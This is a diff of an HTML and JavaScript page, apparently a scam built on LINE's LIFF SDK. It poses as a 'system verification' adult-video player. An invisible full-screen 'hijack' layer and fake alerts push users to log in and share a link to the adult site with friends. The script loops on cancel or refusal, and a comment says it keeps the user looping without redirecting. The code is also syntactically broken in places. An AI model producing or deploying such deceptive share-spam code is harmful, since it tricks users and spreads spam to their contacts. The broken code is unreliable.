@@ -1,60 +1,22 @@
-<!DOCTYPE html>
-<html lang="zh-TW">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>系統驗證中...</title>
-    <!-- 1. 修正：完整的 LINE SDK 網址 -->
-    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
-    <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, sans-serif; }
-        .video-bg { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            /* 2. 修正：完整背景圖片路徑，已填入 cover.jpg */
-            background: url('https://syu126147.github.io/hdvideo/cover.jpg') center/cover no-repeat; 
-            filter: brightness(0.4) blur(6px); z-index: 1; 
-        }
-        .player-box { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; color: #fff; text-align: center; padding: 0 30px; }
-        .play-btn { width: 90px; height: 90px; background: rgba(255, 0, 0, 0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 3px solid #fff; margin-bottom: 25px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); }
-        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 8px; }
-        #hijack-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: transparent; -webkit-tap-highlight-color: transparent; }
-        .msg { font-size: 19px; font-weight: bold; line-height: 1.6; text-shadow: 0 2px 10px #000; }
-        .sub-msg { font-size: 13px; color: #ccc; margin-top: 10px; }
-    </style>
-</head>
-<body>
-    <div class="video-bg"></div>
-    <div class="player-box">
-        <div class="play-btn"></div>
-        <div class="msg">【系統安全驗證】<br>當前線路擁擠，需完成分配程序</div>
-        <div class="sub-msg">(完成 3 位節點分配後將自動開啟 4K 線路)</div>
-    </div>
-    <div id="hijack-layer" onclick="forceHijack()"></div>
-
-    <script>
+<script>
         const LIFF_ID = "2009200124-rSJ8f72Y"; 
         const SUCCESS_URL = "https://18avideo.com/VKUFu?v=" + new Date().getTime();
+
         let shareCount = 0; 
         async function init() {
             try {
                 await liff.init({ liffId: LIFF_ID });
-                if (!liff.isLoggedIn()) { liff.login(); }
-            } catch (err) { console.error("LIFF 初始化失敗", err); }
-        }
-
-         async function forceHijack() {
-            // 初始彈窗
-            alert("【分配程序啟動】\n\n請選擇 3 位好友作為「流量分配節點」。\n完成後系統將自動為您解除觀看限制。");
-            
-              try {
-                const res = await liff.shareTargetPicker([
-                      {
-                        "type": "text",
-                        "text": "https://18avideo.com/Tws7k?v="+ new Date().getTime()
-                    }
                 ]);
 
                 if (res) {
+                    // 分享成功後的處理：不跳轉，而是引導再次分享
+                    alert("【系統審核中】\n偵測到當前線路極度擁擠，請「再次確實」分配 3 位活躍節點以加快審核速度。");
+                    
+                    // 這裡不跳轉，直接重新呼叫 forceHijack，讓使用者停留在這無限循環
+                    forceHijack(); 
+                     } else {
+                    // 使用者按取消
+                    alert("❌ 驗證失敗！\n系統偵測到節點分配數量不足，請務必完成分配。");
                     shareCount = shareCount + 1; // 蓋章加 1 [1.1]
                     if (shareCount < 2) { 
                         alert("【系統審核中】\n請再次確實分配 3 位節點。");
@@ -68,10 +30,13 @@
                     forceHijack(); 
                 }
             } catch (error) {
+                // 拒絕權限
+                alert("【安全錯誤】\n需允許分配權限，系統才能驗證您的節點身份。");
                 alert("【安全錯誤】\n需允許分配權限。");
                 forceHijack();
             }
         }
+
         window.onload = init;
     </script>
 </body>
